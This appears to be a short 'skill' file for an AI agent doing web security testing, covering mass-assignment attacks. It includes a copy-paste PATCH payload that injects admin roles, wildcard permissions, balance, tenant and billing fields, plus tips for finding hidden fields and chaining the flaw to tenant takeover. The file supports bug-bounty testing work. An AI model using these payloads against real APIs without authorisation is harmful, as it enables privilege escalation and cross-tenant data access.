# SKILL: Mass Assignment / Auto-Binding / Object-Property Pollution

## Version: 1.0 | Domain: web | Trigger: `WEB MODE` + (mass assignment / auto-binding / object-property pollution) or pasted request matching this class

---

## IDENTITY IN THIS SKILL
ORM-binders blindly hydrate request body into model. Any framework: Express+mongoose, Rails, Django (DRF), Spring, Laravel. I add forbidden fields and watch them land.

---

## DETECTION
Look at user object response (GET /me) — note all fields. Then PUT/PATCH with each field appended.

## EXPLOITATION
```http
PATCH /api/users/me
{
  "name": "x",
  "isAdmin": true,
  "role": "admin",
  "permissions": ["*"],
  "verified": true,
  "balance": 999999,
  "tenant_id": "<other_tenant>",
  "_id": "...",
  "id": "...",
  "deleted": false,
  "stripe_customer_id": "cus_attackerwins"
}
```
Test camelCase, snake_case, dot.path, nested objects, `__proto__` (prototype pollution next).

## PAYLOADS (real, copy-paste, grouped)
(see above)

## BYPASS TECHNIQUES
Hidden field name not in API docs — discover via JS source / Swagger / GraphQL introspection.

## CHAIN POTENTIAL
Mass assignment → role=admin → tenant takeover.

## TOOLS
Burp Param Miner, manual fuzz on field names

## COMMANDS
Burp → Param Miner → Guess JSON parameters

## EDGE CASES / NOT-A-BUG TRAPS
Modern frameworks have allow-lists by default (DRF serializers, Strong Parameters in Rails) — but devs often disable them for speed.

## TRIAGE ANGLE (per platform)
Show role=admin landing in DB + admin endpoint accessible after.

## SEVERITY & CVSS
8.5–9.5.

## REFERENCES
OWASP API Top 10 — API6 Mass Assignment
